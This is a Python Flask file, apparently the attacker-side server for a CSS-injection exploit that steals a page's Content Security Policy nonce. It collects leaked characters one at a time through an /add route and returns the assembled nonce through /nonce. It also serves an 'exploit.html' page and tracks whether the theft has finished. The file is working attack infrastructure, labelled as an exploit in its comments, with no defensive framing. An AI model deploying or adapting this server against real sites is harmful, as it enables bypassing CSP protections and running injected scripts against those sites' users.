from flask import Flask
app = Flask(__name__, static_url_path='')

nonce = ""
done = "false"

# Add a char to the nonce string when the CSS selector performs a lookup
@app.route('/add/<string:val>')
def add_csp_nonce_value(val):
    global nonce
    nonce = nonce + val
    return "0"

# Return the current value of the nonce string
@app.route('/nonce')
def get_csp_nonce():
    global nonce
    return nonce

# Reset the nonce value to re-run exploit
@app.route('/reset')
def reset_csp_nonce():
    global nonce
    global done
    nonce = ""
    done = "false"
    return "0"

# Main exploit page
@app.route('/exploit')
def exploit():
    return app.send_static_file('exploit.html')

# Set flag to true when full nonce value is retrieved
@app.route('/complete')
def complete():
    global done
    done = "true"
    return ""

# Check if full nonce value has been retrieved
@app.route('/iscomplete')
def iscomplete():
    global done
    return done